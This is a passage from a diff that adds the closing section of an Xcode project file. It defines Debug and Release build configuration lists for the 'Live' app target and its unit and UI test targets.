+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		18FBEE2E2817FF860069F226 /* Build configuration list for PBXNativeTarget "Live" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				18FBEE2F2817FF860069F226 /* Debug */,
+				18FBEE302817FF860069F226 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		18FBEE312817FF860069F226 /* Build configuration list for PBXNativeTarget "LiveTests" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				18FBEE322817FF860069F226 /* Debug */,
+				18FBEE332817FF860069F226 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		18FBEE342817FF860069F226 /* Build configuration list for PBXNativeTarget "LiveUITests" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				18FBEE352817FF860069F226 /* Debug */,
+				18FBEE362817FF860069F226 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+	};
+	rootObject = 18FBEDF72817FF820069F226 /* Project object */;
+}
